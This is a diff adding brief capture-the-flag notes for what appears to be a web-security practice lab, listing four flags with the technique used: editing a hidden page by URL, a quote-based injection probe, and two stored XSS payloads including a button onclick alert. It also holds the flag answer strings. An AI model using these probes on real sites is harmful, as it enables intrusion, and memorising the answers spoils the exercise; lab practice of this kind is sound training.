@@ -1,0 +1,19 @@
+1st Flag: 
+hidden data exposure
+page - 6 was hidden but we could edit it
+http://35.190.155.168/5b0f69d846/page/edit/6
+Flag: ^FLAG^7b9bc9824d1612a3fb832993d6ee65d0bb2404f1a26c79bb1d94e78e3c1c8c30$FLAG$
+
+2nd Flag:
+injection : 35.190.155.168/5b0f69d846/page/edit/6'
+Flag: ^FLAG^e2c3e4a015d7d06e00859e4ab8079dec65265286ba24a2790bf57dc65db0ea44$FLAG$
+
+3rd Flag:
+stored xss
+<button onclick="alert(1);">click</button> 
+view-source code
+Flag: ^FLAG^3a2cc7ddd00e516aa227ac890278849ce1590a6cc86ad7a026dddb55d38c4a9a$FLAG$
+
+4th Flag: 
+When creating the page the title if loaded with <script> isn't vulnerable but when displaying in homepage is vulnerable to stored xss.
+Flag: ^FLAG^3fcf46c0094c96d608e12ac18ac31e4db890e2fe29c1df197069c441ce1b440e$FLAG$
